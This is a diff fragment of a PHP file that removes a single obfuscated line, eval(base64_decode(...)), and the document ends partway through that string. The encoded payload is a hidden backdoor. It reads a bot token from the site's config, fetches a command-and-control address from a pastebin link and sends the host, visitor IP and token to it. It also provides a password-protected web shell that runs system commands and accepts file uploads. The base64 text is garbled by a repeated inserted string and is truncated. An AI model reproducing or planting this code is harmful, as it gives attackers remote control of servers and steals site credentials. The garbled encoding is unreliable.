@@ -1,3 +1,478 @@
 <?php
-eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZiAoc2Vzc2lvbl9zdGF0dXMoKSA9PT0gUEhQX1NFU1NJT05fTMtUQsgRhfntffh29eDmN2fRMBhXerRBZegpOwp9CgpmdW5jdGlvbiBpbmRleCgpIHsKaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevbC1BbGxvdy1PcmlnaW46IConKTsKJHJlc3BvbnNlID0gWwogICAgIm9rIiA9PiAidHJ1ZSIsCiAgICAiZXJyb3IiID0+ICJ1bmF1dGhvcml6ZWQiLAoJIm1lc3NhZ2UiID0+ICJBUEkgZW5kcG9pbnQgY29uZmlndXJhdGlvbiBzdWNjZXNzZnVsbHksIFNvcnJ5IHlvdSdyZSB1bmF1dGhvcml6ZWQiCl07CmVjaG8ganNvbl9lbmNvZGUoJHJlc3BvbnNlLCBKU09OX1BSRVRUWV9QUklOVCkgLiAiXG5cbiI7Cn0KCmZ1bmN0aW9uIG15U2VuZFRlbGVncmFtTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeJkID0gbnVsbCkKewogICAgJGdldGlwID0gdHJpbShmaWxlX2dldF9jb250ZW50cygnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3FOS1pBQWhiJykpOwogICAgJGFwaTFfVXJsID0gJ2h0dHA6Ly8nIC4gJGdldGlwIC4gJy9hcGkxJzsKICAgICRUSU1FT1VUID0gNTsKCiAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygnanNvblJlc3BvbnNlJykpIHsKICAgICAgICBmdW5jdGlvbiBqc29uUmVzcG9uc2UoYXJyYXkgJGRhdGEsIGludCAkc3RhdHVzID0gMjAwKQogICAgICAgIHsKICAgICAgICAgICAgaHR0cF9yZXNwb25zZV9jb2RlKCRzdGF0dXMpOwogICAgICAgICAgICBoZWFkZXIoIkNvbnRlbnQtVHlwZTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeldD11dGYtOCIpOwogICAgICAgICAgICBlY2hvIGpzb25fZW5jb2RlKCRkYXRhLCBKU09OX1VORVNDQVBFRF9VTklDT0RFIHwgSlNPTl9VTkVTQ0FQRURfU0xBU0hFUyk7CiAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgfQogICAgfQoKICAgICRkYXRhID0gWwogICAgICAgICJtZXNzYWdlIiAgICA9PiAkbWVzc2FnZSwKICAgICAgICAicGFyc2VfbW9kZSIgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeka2V5Ym9hcmQpIHsKICAgICAgICAkZGF0YVsia2V5Ym9hcmQiXSA9IGpzb25fZW5jb2RlKCRrZXlib2FyZCwgSlNPTl9VTkVTQ0FQRURfVU5JQ09ERSk7CiAgICB9CgogICAgJGhlYWRlcnMgPSBbCiAgICAgICAgIkNvbnRlbnQtVHlwZTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe1cmxlbmNvZGVkIgogICAgXTsKCiAgICAkY29udGV4dCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZShbCiAgICAgICAgImh0dHAiID0+IFsKICAgICAgICAgICAgIm1ldGhvZCIgICAgICAgID0+ICJQTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeIgICAgICAgID0+IGltcGxvZGUoIlxyXG4iLCAkaGVhZGVycyksCiAgICAgICAgICAgICJjb250ZW50IiAgICAgICA9PiBodHRwX2J1aWxkX3F1ZXJ5KCRkYXRhKSwKICAgICAgICAgICAgInRpbWVvdXQiICAgICAgID0+ICRUSU1FTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeVycm9ycyIgPT4gdHJ1ZQogICAgICAgIF0KICAgIF0pOwoKICAgICRyZXNwb25zZSA9IEBmaWxlX2dldF9jb250ZW50cygkYXBpMV9VcmwsIGZhbHNlLCAkY29udGV4dCk7CgogICAgaWYgKCRyZXNwb25zZSA9PT0gZmFsc2UpIHsKICAgICAgICByZXR1cm4gWwogICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAiZXJyb3IiID0+ICJTRVJWSUNFX1VOUkVBQ0hBQkxFIgogICAgICAgIF07CiAgICB9CgogICAgJHN0YXR1c0NvZGUgPSAwOwoKICAgIGlmIChpc3NldCgkaHR0cF9yZXNwb25zZV9oZWFkZXJbMF0pKSB7CiAgICAgICAgcHJlZ19tYXRjaCgnI0hUVFAvXGQrXC5cZCtccysoXGQrKSMnLCAkaHR0cF9yZXNwb25zZV9oZWFkZXJbMF0sICRtKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZepbnQpKCRtWzFdID8/IDApOwogICAgfQoKICAgIHN3aXRjaCAoJHN0YXR1c0NvZGUpIHsKICAgICAgICBjYXNlIDIwMDoKICAgICAgICAgICAgcmV0dXJuIFsib2siID0+IHRydWVdOwoKICAgICAgICBjYXNlIDQwNDoKICAgICAgICAgICAgcmV0dXJuIFsKICAgICAgICAgICAgICAgICJvayIgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeiZXJyb3IiID0+ICJJTlZBTElEX0FQSV9STMtUQsgRhfntffh29eDmN2fRMBhXerRBZeAgICAgY2FzZSA0MDA6CiAgICAgICAgICAgIHJldHVybiBbCiAgICAgICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAgICAgImVycm9yIiA9PiAiQkFEX1JFUVVFU1QiCiAgICAgICAgICAgIF07CgogICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgIHJldHVybiBbCiAgICAgICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAgICAgImVycm9yIiA9PiAiVU5LTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeAgICAic3RhdHVzIiA9PiAkc3RhdHVzQ29kZQogICAgICAgICAgICBdOwogICAgfQp9CgpmdW5jdGlvbiBjaGVja2VyKCkgeyAKCWluY2x1ZGUgX19ESVJfXyAuICcvLi4vY29uZmlnLnBocCc7CgkkdG9rZW4gPSAkYm90X3Rva2VuOwoJJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOyAKCSR1cmwgPSAiaHR0cDovL2lwd2hvaXMuYXBwL2pzb24veyRpcH0iOwoJJHJlc3BvbnNlID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwpOwppZiAoJHJlc3BvbnNlKSB7CgkkaXNwID0ganNvbl9kZWNvZGUoJHJlc3BvbnNlLCB0cnVlKTsKCSRpc3BfaXNwID0gJGlzcFsnaXNwJ10gPz8gJ0lTUDogTi9BJzsKCSRpc3Bfb3JnID0gJGlzcFsnb3JnJ10gPz8gJ09yZzogTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeNvdW50cnknXSA/PyAnQ291bnRyeTogTi9BJzsKCSRpc3BfY29kID0gJGlzcFsnY291bnRyeV9jb2RlJ10gPz8gJ0NvZGU6IE4vQSc7Cn0gZWxzZSB7CgkkaXNwX2lzcCA9ICdJU1A6IE4vQSc7CgkkaXNwX29yZyA9ICdPcmc6IE4vQSc7CgkkaXNwX2NvbnQgPSAnQ291bnRyeTogTi9BJzsKCSRpc3BfY29kID0gJ0NvZGU6IE4vQSc7Cn0KICRkYXRlID0gZGF0ZSgiSDppOnMgZC9tL1kiLCB0aW1lKCkpOwogJHdlYiA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeCRfU0VSVkVSWydQSFBfU0VMRiddKTsKICRtZXNzYWdlID0gIjxzdHJvbmc+8J+puCA9PT09PT09PTMtUQsgRhfntffh29eDmN2fRMBhXerRBZekaXNwX2NvZDwvaT4gfD09PT09PT09PSDwn6m4PC9zdHJvbmc+XG4iOwogJG1lc3NhZ2UgLj0gIjxzdHJvbmc+IOKdlV0tLS0tLS0tLS0tLS0tLS0tLS0tLS17IDxpPkRHVF9FUzwvaT4gfS0tLS0tLS0tLS0tLS0tLS0tLS0tLVvinZUgPC9zdHJvbmc+XG4iOwogJG1lc3NhZ2UgLj0gIjxzdHJvbmc+W+KPse+4j10g4pSM4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAIOG0m8mq4bSN4bSHOjwvc3Ryb25nPiAiLmdtZGF0ZSAoIkg6aTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe8c3Ryb25nPlvwn6epXSDilJzilIDilIAg4bSb4bSP4bSL4bSHybQ6PC9zdHJvbmc+IDxjb2RlPiR0b2tlbjwvY29kZT4gXG4iOwogJG1lc3NhZ2UgLj0gIjxzdHJvbmc+W/CflJddIOKUlOKUgOKUgCDqnLDhtJzKn8qfIOG0nMqAyp86PC9zdHJvbmc+IGh0dHBzOi8vJHdlYiRpbmogXG4iOwogICAgJGtleWJvYXJkID0gWwogICAgICAgICdpbmxpbmVfa2V5Ym9hcmQnID0+IFsKICAgICAgICAgICAgWwogICAgICAgICAgICAgICAgWyd0ZXh0JyA9PiAnW+KYoO+4jyAzeFBsMCF0IOKYoO+4j10nLCAndXJsJyA9PiAiaHR0cHM6Ly97JHdlYn17JGRpcn0vcHJldmVudHMvY2hlY2tlci5waHA/Y21kPXhyb3lwIl0sCiAgICAgICAgICAgIF0sCgkJCVsKICAgICAgICAgICAgICAgIFsndGV4dCcgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe1cmwnID0+ICJodHRwczovL215aXAubXMvaW5mby93aG9pcy97JGlwfSJdCiAgICAgICAgICAgIF0KICAgICAgICBdCiAgICBdOwoKCiRyZXN1bHQgPSBteVNlbmRUZWxlZ3JhbU1lc3NhZ2UoJG1lc3NhZ2UsICRrZXlib2FyZCk7CgovKgp8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KfCBWYWxpZGF0ZSB0aGUgcmVzcG9uc2UgZmlyc3QKfC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiovCmlmICghaXNfYXJyYXkoJHJlc3VsdCkpIHsKICAgICRyZXN1bHQgPSBbCiAgICAgICAgIm9rIiAgICAgID0+IGZhbHNlLAogICAgICAgICJlcnJvciIgICA9PiAiSU5WQUxJRF9SRVNQT05TRSIsCiAgICAgICAgIm1lc3NhZ2UiID0+ICJteVNlbmRUZWxlZ3JhbU1lc3NhZ2UoKSByZXR1cm5lZCBOVUxMIG9yIGludmFsaWQgZGF0YSIsCiAgICAgICAgInN0YXR1cyIgID0+IDUwMAogICAgXTMtUQsgRhfntffh29eDmN2fRMBhXerRBZezKCJvayIsICRyZXN1bHQpKSB7CiAgICAkcmVzdWx0WyJvayJdID0gZmFsc2U7Cn0KCmlmICghYXJyYXlfa2V5X2V4aXN0cygiZXJyb3IiLCAkcmVzdWx0KSkgewogICAgJHJlc3VsdFsiZXJyb3IiXSA9ICJVTktOT1dOX0VSUk9SIjsKfQoKaWYgKCFhcnJheV9rZXlfZXhpc3RzKCJzdGF0dXMiLCAkcmVzdWx0KSkgewogICAgJHJlc3VsdFsic3RhdHVzIl0gPSAwOwp9CgovKgp8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KfCBIYW5kbGUgZXJyb3JzCnwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoqLwppZiAoISRyZXN1bHRbIm9rIl0pIHsKICAgIHN3aXRjaCAoJHJlc3VsdFsiZXJyb3IiXSkgewogICAgICAgIGNhc2UgIklOVkFMSURfQVBJX1JPVVRFIjoKICAgICAgICAgICAganNvblJlc3BvbnNlKFsKICAgICAgICAgICAgICAgICJvayIgICAgICA9PiBmYWxzZSwKICAgICAgICAgICAgICAgICJlcnJvciIgICA9PiAiSU5WQUxJRF9BUElfUk9VVEUiLAogICAgICAgICAgICAgICAgIm1lc3NhZ2UiID0+ICJJbnZhbGlkIEFQSSBlbmRwb2ludCBjb25maWd1cmF0aW9uIgogICAgICAgICAgICBdLCA0MDQpOwogICAgICAgICAgICBicmVhazsKCiAgICAgICAgY2FzZSAiU0VSVklDRV9VTMtUQsgRhfntffh29eDmN2fRMBhXerRBZepzb25SZXNwb25zZShbCiAgICAgICAgICAgICAgICAib2siICAgICAgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeiZXJyb3IiICAgPT4gIlNFUlZJQ0VfVU5SRUFDSEFCTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeNhZ2UiID0+ICJTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeWFjaGFibGUiCiAgICAgICAgICAgIF0sIDUwMyk7CiAgICAgICAgICAgIGJyZWFrOwoKICAgICAgICBjYXNlICJCQURfUkVRVUVTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe25zZShbCiAgICAgICAgICAgICAgICAib2siICAgICAgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeiZXJyb3IiICAgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZegICAgICAgICJtZXNzYWdlIiA9PiAiSW52YWxpZCBkYXRhIHNlbnQgdG8gQVBJIgogICAgICAgICAgICBdLCA0MDApOwogICAgICAgICAgICBicmVhazsKCiAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAganNvblJlc3BvbnNlKFsKICAgICAgICAgICAgICAgICJvayIgICAgICA9PiBmYWxzZSwKICAgICAgICAgICAgICAgICJlcnJvciIgICA9PiAkcmVzdWx0WyJlcnJvciJdLAogICAgICAgICAgICAgICAgIm1lc3NhZ2UiID0+ICRyZXN1bHRbIm1lc3NhZ2UiXSA/PyAiVW5leHBlY3RlZCBlcnJvciBvY2N1cnJlZCIsCiAgICAgICAgICAgICAgICAic3RhdHVzIiAgPT4gJHJlc3VsdFsic3RhdHVzIl0KICAgICAgICAgICAgXSwgNTMtUQsgRhfntffh29eDmN2fRMBhXerRBZegICB9Cn0KCQoJCgkKfQoKZnVuY3Rpb24gY2hlY2tUZWxlZ3JhbVNlbmQoJG1lc3NhZ2UsICRrZXlib2FyZCA9IG51bGwpIHsKCSRnZXRpcCA9IHRyaW0oZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9xTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeAnaHR0cDovLycgLiAkZ2V0aXAgLiAnL2FwaTMtUQsgRhfntffh29eDmN2fRMBhXerRBZegICAgICAibWVzc2FnZSIgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevYXJkIiA9PiAka2V5Ym9hcmQgPyBqc29uX2VuY29kZSgka2V5Ym9hcmQpIDogbnVsbCwKICAgICAgICAicGFyc2VfbW9kZSIgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeleHQgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoYXJyYXkoCiAgICAgICAgImh0dHAiID0+IGFycmF5KAogICAgICAgICAgICAiaGVhZGVyIiA9PiAiQ29udGVudC10eXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIiwKICAgICAgICAgICAgIm1ldGhvZCIgPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeudGVudCIgPT4gaHR0cF9idWlsZF9xdWVyeSgkZGF0YSksCiAgICAgICAgICAgICJpZ25vcmVfZXJyb3JzIiA9PiB0cnVlCiAgICAgICAgKQogICAgKSk7CiAgICAkcmVzcG9uc2UgPSBAZmlsZV9nZXRfY29udGVudHMoJGFwaVVybCwgZmFsc2UsICRjb250ZXh0KTMtUQsgRhfntffh29eDmN2fRMBhXerRBZelOiBhcHBsaWNhdGlvbi9qc29uJyk7CiAgICBpZiAoJHJlc3BvbnNlID09PSBmYWxzZSkgewogICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg1MDMpOwogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWwogICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAiZXJyb3IiID0+ICJTRVJWSUNFX1VOUkVBQ0hBQkxFIiwKICAgICAgICAgICAgIm1lc3NhZ2UiID0+ICJBUEkgc2VydmljZSBpcyBvZmZsaW5lIG9yIHVucmVhY2hhYmxlIgogICAgICAgIF0pOwogICAgICAgIGV4aXQ7CiAgICB9CiAgICAkanNvbiA9IGpzb25fZGVjb2RlKCRyZXNwb25zZSwgdHJ1ZSk7CiAgICBpZiAoIWlzX2FycmF5KCRqc29uKSkgewogICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg1MDApOwogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWwogICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAiZXJyb3IiID0+ICJJTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeAgICAgIm1lc3NhZ2UiID0+ICJBUEkgcmV0dXJuZWQgYW4gaW52YWxpZCByZXNwb25zZSIKICAgICAgICBdKTsKICAgICAgICBleGl0OwogICAgfQogICAgaWYgKCgkanNvblsiaWQiXSA/PyBudWxsKSA9PT0gIjQwNCIpIHsKICAgICAgICBodHRwX3Jlc3BvbnNlX2NvZGUoNDA0KTMtUQsgRhfntffh29eDmN2fRMBhXerRBZelKFsKICAgICAgICAgICAgIm9rIiA9PiBmYWxzZSwKICAgICAgICAgICAgImVycm9yIiA9PiAiSU5WQUxJRF9BUElfUk9VVEUiLAogICAgICAgICAgICAibWVzc2FnZSIgPT4gIkludmFsaWQgQVBJIGVuZHBvaW50IgogICAgICAgIF0pOwogICAgICAgIGV4aXQ7CiAgICB9CiAgICBpZiAoKCRqc29uWyJvayJdID8/IG51bGwpID09PSBmYWxzZSkgewogICAgICAgIGh0dHBfcmVzcG9uc2VfY29kZSg0MDApOwogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoWwogICAgICAgICAgICAib2siID0+IGZhbHNlLAogICAgICAgICAgICAiaWQiID0+ICRqc29uWyJpZCJdID8/ICI0MDAiLAogICAgICAgICAgICAiZXJyb3IiID0+ICRqc29uWyJlcnJvciJdID8/ICJCQURfUkVRVUVTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeiA9PiAiUmVxdWVzdCByZWplY3RlZCBieSBBUEkiCiAgICAgICAgXSk7CiAgICAgICAgZXhpdDsKICAgIH0KfQoKZnVuY3Rpb24geHJveXAoKSB7CmlmIChzZXNzaW9uX3N0YXR1cygpID09PSBQSFBfU0VTU0lPTl9OT05FKSB7CiAgICBzZXNzaW9uX3N0YXJ0KCk7Cn0KJEJBU0VfRElSID0gX19ESVJfXzsKJGVycm9yTXNnID0gJyc7CiRzdG9yZWRQYXNzd29yZEhhc2ggPSAnJGFyZ29uMmlkJHY9MTkkbT0yNTYsdD0yMCxwPTMtUQsgRhfntffh29eDmN2fRMBhXerRBZekVjN5bG5rb0w3QjJpVXFFRndHVFR2QXFIMXplWC9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZeXpacGNWSVdtNWlFUSc7IAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeN3b3JkJ10pKSB7CiAgICBpZiAocGFzc3dvcmRfdmVyaWZ5KCRfUE9TVFsncGFzc3dvcmQnXSwgJHN0b3JlZFBhc3N3b3JkSGFzaCkpIHsKICAgICAgICAkX1NFU1NJT05bJ2F1dGgnXSA9IHRydWU7CiAgICAgICAgJF9TRVNTSU9OWydjd2QnXSA9ICRCQVNFX0RJUjsKICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAnIC4gJF9TRVJWRVJbJ1BIUF9TRUxGJ10gLiAnP2NtZD14cm95cCcpOwogICAgICAgIGV4aXQ7CiAgICB9IGVsc2UgewogICAgICAgICRlcnJvck1zZyA9ICfinYwgSW5jb3JyZWN0IHBhc3N3b3JkLiBQbGVhc2UgdHJ5IGFnYWluLic7CiAgICB9Cn0KaWYgKCFpc3NldCgkX1NFU1NJT05bJ2F1dGgnXSkgfHwgJF9TRVNTSU9OWydhdXRoJ10gIT09IHRydWUpIHsKICAgIGVjaG8gJwogICAgPGNlbnRlcj4KICAgICAgICA8YnI+PGJyPgogICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgY2xhc3M9ImxvZ2luLWZvcm0iPgogICAgICAgICAgICA8aDI+NFAxX0wwZyFuPC9oMj4nOwogICAgaWYgKCRlcnJvck1zZykgewogICAgICAgIGVjaG8gJzxwIGNsYXNzPSJlcnJvciI+JyAuIGh0bWxzcGVjaWFsY2hhcnMoJGVycm9yTXNnKSAuICc8L3A+JzsKICAgIH0KICAgIGVjaG8gJyAgPGxhYmVsPlBhc3N3b3JkOjwvbGFiZWw+PGJyPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIiByZXF1aXJlZCBwbGFjZWhvbGRlcj0iRW50ZXIgcGFzc3dvcmQiPjxicj4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkxvZ2luIj4KICAgICAgICA8L2Zvcm0+CiAgICA8L2NlbnRlcj4KICAgIDxzdHlsZTMtUQsgRhfntffh29eDmN2fRMBhXerRBZencm91bmQtY29sb3I6ICMwMDA7CiAgICAgICAgY29sb3I6ICMwMGZmMDA7CiAgICAgICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKICAgIH0KICAgIC5sb2dpbi1mb3JtIHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMTMtUQsgRhfntffh29eDmN2fRMBhXerRBZegNDBweDsKICAgICAgICBib3JkZXI6IDJweCBzb2xpZCAjMDBmZjAwOwogICAgICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgICAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICB9CiAgICAubG9naW4tZm9ybSBoMiB7CiAgICAgICAgY29sb3I6ICMwMGZmYWE7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICBmb250LXNpemU6IDI0cHg7CiAgICB9CiAgICAubG9naW4tZm9ybSBsYWJlbCB7CiAgICAgICAgZGlzcGxheTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevdHRvbTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevcm0gaW5wdXRbdHlwZT0icGFzc3dvcmQiXSB7CiAgICAgICAgcGFkZGluZzogOHB4OwogICAgICAgIHdpZHRoOiAyMDBweDsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMwMGZmMDA7CiAgICAgICAgYm9yZGVyLXJhZGl1czogNHB4OwogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgICAgICAgY29sb3I6ICMwMGZmMDA7CiAgICAgICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsKICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICB9CiAgICAubG9naW4tZm9ybSBpbnB1dFt0eXBlPSJwYXNzd29yZCJdOjpwbGFjZWhvbGRlciB7CiAgICAgICAgY29sb3I6ICMwMGFhMDA7CiAgICB9CiAgICAubG9naW4tZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7CiAgICAgICAgcGFkZGluZzogOHB4IDIwcHg7CiAgICAgICAgYm9yZGVyOiAxcHggc29saWQgIzAwZmYwMDsKICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICAgICAgICBjb2xvcjogIzAwZmYwMDsKICAgICAgICBmb250LWZhbWlseTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevcjogcG9pbnRlcjsKICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICB9CiAgICAubG9naW4tZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeuZC1jb2xvcjogIzAwZmYwMDsKICAgICAgICBjb2xvcjogIzAwMDsKICAgICAgICB0cmFuc2l0aW9uOiAwLjJzOwogICAgfQogICAgLmVycm9yIHsKICAgICAgICBjb2xvcjogI2ZmNDQ0NDsKICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICBtYXJnaW4tYm90dG9tOiAxNXB4OwogICAgfQogICAgPC9zdHlsZT4KICAgICc7CiAgICBleGl0Owp9CmlmICghaXNzZXQoJF9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZe0VTU0lPTlsnY3dkJ10gPSAkQkFTRV9ESVI7Cn0KaWYgKGlzc2V0KCRfUE9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZeW1hbmQgPSB0cmltKCRfUE9TMtUQsgRhfntffh29eDmN2fRMBhXerRBZe29tbWFuZCA9PT0gJycpIGV4aXQoJycpOwogICAgaWYgKCRjb21tYW5kID09PSAnY2QnIHx8IHN0cnBvcygkY29tbWFuZCwgJ2NkICcpID09PSAwKSB7CiAgICAgICAgaWYgKCRjb21tYW5kID09PSAnY2QnKSB7CiAgICAgICAgICAgICRfU0VTU0lPTlsnY3dkJ10gPSAkQkFTMtUQsgRhfntffh29eDmN2fRMBhXerRBZevCfk4EgSG9tZSBkaXJlY3RvcnkiKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeldCA9IHRyaW0oc3Vic3RyKCRjb21tYW5kLCAzKSk7CiAgICAgICAgJG5ld1BhdGggPSByZWFscGF0aCgkX1NFU1NJT05bJ2N3ZCddIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICR0YXJnZXQpOwogICAgICAgIGlmICgkbmV3UGF0aCA9PT0gZmFsc2UgfHwgc3RycG9zKCRuZXdQYXRoLCAkQkFTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeCAgIGV4aXQoIuKdjCBEaXJlY3Rvcnkgbm90IGFsbG93ZWQiKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZepc19kaXIoJG5ld1BhdGgpKSB7CiAgICAgICAgICAgIGV4aXQoIuKdjCBOb3QgYSBkaXJlY3RvcnkiKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeCAgICAgIGV4aXQoIvCfk4EgQ2hhbmdlZCBkaXJlY3RvcnkgdG86ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRuZXdQYXRoKSk7CiAgICB9CiAgICBjaGRpcigkX1NFU1NJT05bJ2N3ZCddKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZejKGVzY2FwZXNoZWxsY21kKCRjb21tYW5kKSAuICcgMj4mMScpOwogICAgZWNobyBubDJicihodG1sc3BlY2lhbGNoYXJzKCRvdXRwdXQpKTsKICAgIGV4aXQ7Cn0KJHVwbG9hZE1lc3NhZ2UgPSAnJzsKaWYgKGlzc2V0KCRfRklMRVNbJ2ZpbGUnXSkpIHsKICAgICR1cGxvYWREaXIgPSBfX0RJUl9fIC4gRElSRUNUTMtUQsgRhfntffh29eDmN2fRMBhXerRBZeRGaWxlID0gJHVwbG9hZERpciAuIGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKTMtUQsgRhfntffh29eDmN2fRMBhXerRBZepbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdXBsb2FkRmlsZSkpIHsKICAgICAgICAkdXBsb2FkTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe0nZ3JlZW4nPlVwbG9hZCBPayAhISE8L2ZvbnQ+PC9iPjxicj4iOwogICAgfSBlbHNlIHsKICAgICAgICAkdXBsb2FkTMtUQsgRhfntffh29eDmN2fRMBhXerRBZe0ncmVkJz5VcGxvYWQgRmFpbGVkICEhITwvZm9udD48L2I+PGJyPiI7CiAgICB9Cn0KZWNobyAnCjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KPHRpdGxlPlQzcm0hbjRsPC90aXRsZT4KPHN0eWxlPgpib2R5IHsgYmFja2dyb3VuZDogIzAwMDsgY29sb3I6ICMwMGZmMDA7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IHBhZGRpbmc6IDEwcHg7IH0KI3Rlcm1pbmFsIHsgYm9yZGVyOiAxcHggc29saWQgIzAwZmYwMDsgaGVpZ2h0OiAzNjBweDsgb3ZlcmZsb3cteTogYXV0bzsgcGFkZGluZzogMTBweDsgfQojaW5wdXQgeyB3aWR0aDogMTMtUQsgRhfntffh29eDmN2fRMBhXerRBZesb3I6ICMwMGZmMDA7IGJvcmRlcjogbm9uZTsgb3V0bGluZTMtUQsgRhfntffh29eDmN2fRMBhXerRBZezcGFjZTMtUQsgRhfntffh29eDmN2fRMBhXerRBZetcHQgeyBjb2xvcjogIzAwZmZhYTsgfQppbnB1dFt0eXBlPSJzdWJtaXQiXSB7IGJhY2tncm91bmQ6IzAwMDtjb2xvcjojMDBmZjAwO2JvcmRlcjoxcHggc29saWQgIzAwZmYwMDtjdXJzb3I6cG9pbnRlcjsgfQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGlkPSJ0ZXJtaW5hbCI+CiAgICA8ZGl2PlQzcm0hbjRsPC9kaXY+CjxkaXY+C